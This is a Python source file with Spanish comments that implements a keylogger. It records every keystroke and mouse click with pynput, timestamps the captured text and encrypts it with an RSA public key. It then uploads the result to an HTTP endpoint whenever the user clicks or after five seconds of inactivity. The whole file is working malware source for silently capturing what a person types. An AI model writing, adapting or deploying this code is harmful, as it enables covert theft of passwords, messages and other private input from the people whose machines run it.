from pynput import keyboard, mouse
import threading
import time
import datetime
import requests

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


key_log = []
ultima_pulsacion = time.time()


# Función para manejar las pulsaciones de teclas
def on_press(key):
    global ultima_pulsacion
    try:
        key_log.append(f"{key.char}")

    except AttributeError:
        if key == keyboard.Key.space:
            key_log.append(" ")
        elif key == keyboard.Key.enter:
            key_log.append("\n")
        elif key == keyboard.Key.backspace:
            key_log.append("\\ borrar \\")
        else:
            key_log.append(f"\\ {key} \\")

    ultima_pulsacion = time.time()  # Actualizar el tiempo de la última pulsación


# Función para guardar las pulsaciones de teclas en un archivo
def enviar(event_name):
    if key_log:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_log = "".join(key_log)

        log_content = (
            f"-----------------------[{event_name}]---------------------\n"
            f"{timestamp}\n"
            f"{formatted_log}\n"
            "-----------------------[Fin del evento]---------------------"
        )

        # Ensure log_content is in bytes
        log_content_bytes = log_content.encode("utf-8")

        encripted_log = b""  # Initialize as bytes
        with open("public.key", "rb") as f:
            public_key = RSA.import_key(f.read())
            cipher_rsa = PKCS1_OAEP.new(public_key)
            encripted_log = cipher_rsa.encrypt(log_content_bytes)

        url = "http://localhost:3000/Registrar"
        data = {"texto": encripted_log.hex()}  # Convert to hex for JSON serialization

        _ = requests.post(url, json=data)

        key_log.clear()  # Limpiar el registro después de guardar


# Funciones para manejar cuando enviar las pulsaciones
def on_click(x, y, button, pressed):
    if pressed:
        enviar("Clic del ratón")


def monitor_inactivity():
    global ultima_pulsacion
    while True:
        current_time = time.time()
        if (
            current_time - ultima_pulsacion >= 5
        ):  # Si ha pasado 5 segundos de inactividad
            enviar("Timeout de 5 segundos")
        time.sleep(1)


# Iniciar el monitoreo de inactividad en un hilo separado
inactivity_thread = threading.Thread(
    target=monitor_inactivity
)  # hilo necesario por el sleep
inactivity_thread.daemon = True
inactivity_thread.start()


# Listener de teclado
keyboard_listener = keyboard.Listener(on_press=on_press)

# Listener de ratón
mouse_listener = mouse.Listener(on_click=on_click)

# Iniciar los listeners
keyboard_listener.start()
mouse_listener.start()

# Mantener el programa en ejecución
keyboard_listener.join()
mouse_listener.join()
